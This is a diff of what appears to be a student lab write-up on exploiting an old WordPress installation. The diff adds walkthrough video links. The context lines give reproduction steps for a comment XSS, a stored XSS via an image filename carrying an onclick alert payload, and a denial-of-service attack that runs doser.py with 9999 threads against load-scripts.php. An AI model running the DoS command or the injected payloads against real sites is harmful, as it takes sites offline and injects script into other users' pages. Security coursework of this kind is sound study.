@@ -11,7 +11,7 @@ Time spent: **6** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.4
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: https://youtu.be/K7hTDUGLYe8
   - [ ] Steps to recreate: Once you have your script ready, post it as a comment on any post on a WordPress page. Once the comment is posted, either scroll up for the script to be activated, or refresh the page and it will activate. 
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
@@ -21,7 +21,7 @@ Time spent: **6** hours spent in total
     - Vulnerability types: DoS - Denial of Service
     - Tested in version: 4.2
     - Fixed in version: Unpatched
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: https://youtu.be/O4s8cxdzHQs
   - [ ] Steps to recreate: Download the python script from https://github.com/quitten/doser.py, and run the following command: 
   ```python doser.py -g 'http://mywpserver.com/wp-admin/load-scripts.php?c=1&load%5B%5D=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter&ver=4.9' -t 9999``` The script is now running, and the WordPress site should be unreachable. If you want to stop the script, either close the terminal window or terminate the script using CTRL + C.
   - [ ] Affected source code:
@@ -31,7 +31,7 @@ Time spent: **6** hours spent in total
     - Vulnerability types: Stored XSS
     - Tested in version: 4.0
     - Fixed in version: 4.0.13
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: https://youtu.be/XSD3R5st3_M
   - [ ] Steps to recreate: You can download any image as a jpg, make the filename ```name<img src=a onclick=alert('string')>.jpg```. Once you have this file downloaded, log onto WordPress as an admin, click "Media" on the left side of the page, and add the picture you made earlier to your library. Click the library again to see your picture uploaded, click on it, click "view attachment page" at the bottom of the page, click the broken image icon, and your XSS will pop up on the screen.  
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
@@ -42,7 +42,7 @@ Exploit 2 Python Script - https://github.com/quitten/doser.py
 
 ## Resources
 
-- [Vagrant](https://core.trac.wordpress.org/browser/)
+- [Vagrant](https://www.vagrantup.com/)
 - [Exploit 3 Explanation](https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html)
 - [Exploit 2 Explanation]
 (https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html)
